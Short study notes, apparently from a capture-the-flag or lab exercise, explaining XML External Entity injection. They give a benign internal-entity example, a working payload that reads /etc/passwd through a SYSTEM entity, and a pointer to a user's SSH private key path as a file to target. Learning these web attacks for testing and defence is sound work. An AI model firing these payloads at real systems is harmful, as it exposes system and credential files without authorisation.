# XXE Payload

<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>

As we can see we are defining a ENTITY called name and assigning it a value feast:

falcon feast

---

We can also use XXE to read some file from the system by defining an ENTITY and having it use the SYSTEM keyword

<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>

Here again, we are defining an ENTITY with the name read but the difference is that we are setting it value to `SYSTEM` and path of the file.

If we use this payload then a website vulnerable to XXE(normally) would display the content of the file /etc/passwd.

where is ssh key located linux?

home/falcon/.ssh/id_rsa
